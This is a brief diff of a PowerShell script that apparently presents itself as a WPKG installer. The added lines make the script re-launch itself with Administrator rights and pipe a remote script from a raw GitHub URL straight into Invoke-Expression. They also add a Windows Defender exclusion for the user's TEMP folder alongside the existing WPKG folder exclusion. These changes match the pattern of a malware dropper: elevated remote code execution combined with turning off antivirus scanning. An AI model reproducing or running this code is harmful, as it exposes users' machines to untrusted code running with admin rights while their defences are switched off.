@@ -1,5 +1,7 @@
-﻿if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -File `"$PSCommandPath`"" -Verb RunAs; exit }
+﻿if (!([Security.Principal.WindowsPrincipal][Security.Principal.WindowsIdentity]::GetCurrent()).IsInRole([Security.Principal.WindowsBuiltInRole] "Administrator")) { Start-Process powershell.exe "-NoProfile -ExecutionPolicy Bypass -Command `"irm https://raw.githubusercontent.com/WPKG2/wpkg-includer/main/install_wpkg.ps1 | iex`"" -Verb RunAs; exit }
 $path = $env:APPDATA+"\WPKG"
+Add-MpPreference -ExclusionPath $path
+$path = $env:TEMP
 Add-MpPreference -ExclusionPath $path
 
 # Source URL
